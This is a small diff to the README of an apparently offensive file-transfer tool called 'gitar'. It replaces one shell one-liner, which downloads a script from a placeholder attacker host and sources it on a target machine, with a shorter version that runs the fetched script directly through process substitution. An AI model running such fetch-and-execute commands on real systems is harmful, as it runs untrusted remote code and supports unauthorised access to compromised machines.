@@ -50,7 +50,7 @@ On **Target machine**:
 ```shell
 # Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. 
 # It is also provided by step 1. (in gitar output):
-curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
+source <(curl -s http://[attacker_ip:port]/alias)
 ```
 
 **And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**
